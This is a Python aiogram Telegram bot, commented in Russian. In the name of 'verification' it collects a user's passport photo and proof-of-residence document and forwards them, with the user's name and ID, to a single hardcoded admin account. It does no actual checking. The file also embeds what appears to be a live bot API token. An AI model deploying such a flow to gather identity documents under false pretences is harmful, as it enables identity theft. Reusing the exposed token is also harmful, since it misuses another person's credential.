import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- НАСТРОЙКИ ---
API_TOKEN = '8057490845:AAH7Qdd_SDqY6n-jwyAsuKT1vwLKWvwW3mI'
ADMIN_ID = 8493488136  # ВАШ ID (куда придут фото)

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Инициализация бота и диспетчера
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Состояния (этапы опроса)
class VerificationSteps(StatesGroup):
    waiting_for_passport = State()
    waiting_for_residence = State()

# Команда /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer(
        "Здравствуйте! Для верификации необходимо прислать документы.\n\n"
        "Шаг 1: Пожалуйста, пришлите **фото вашего паспорта**."
    )
    await state.set_state(VerificationSteps.waiting_for_passport)

# Получение фото паспорта
@dp.message(VerificationSteps.waiting_for_passport, F.photo)
async def process_passport(message: types.Message, state: FSMContext):
    # Сохраняем ID фото во временное хранилище
    await state.update_data(passport_photo=message.photo[-1].file_id)
    
    await message.answer(
        "Спасибо. Шаг 2:\n"
        "Пришлите фото документа, подтверждающего место жительства "
        "(квитанция ЖКХ, выписка из банка и т.д.).\n\n"
        "⚠️ Документ должен быть **не старше 3 месяцев** и быть в бумажном виде (не скриншот)."
    )
    await state.set_state(VerificationSteps.waiting_for_residence)

# Получение фото прописки/ЖКХ и отправка админу
@dp.message(VerificationSteps.waiting_for_residence, F.photo)
async def process_residence(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    passport_file_id = user_data['passport_photo']
    residence_file_id = message.photo[-1].file_id
    
    user_info = (
        f"Новая заявка от: @{message.from_user.username}\n"
        f"Имя: {message.from_user.full_name}\n"
        f"ID: {message.from_user.id}"
    )

    # Отправка фото вам (админу)
    await bot.send_message(ADMIN_ID, f"🔔 **Новые документы!**\n{user_info}")
    
    # Отправляем фото альбомом (группой)
    media = [
        types.InputMediaPhoto(media=passport_file_id, caption="1. Паспорт"),
        types.InputMediaPhoto(media=residence_file_id, caption="2. Место жительства")
    ]
    await bot.send_media_group(ADMIN_ID, media=media)

    await message.answer("Благодарим! Ваши документы отправлены на проверку.")
    await state.clear()

# Обработка некорректного ввода (если прислали текст вместо фото)
@dp.message(VerificationSteps.waiting_for_passport)
@dp.message(VerificationSteps.waiting_for_residence)
async def wrong_format(message: types.Message):
    await message.answer("Пожалуйста, пришлите именно **фотографию** документа.")

# Запуск бота
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот выключен")
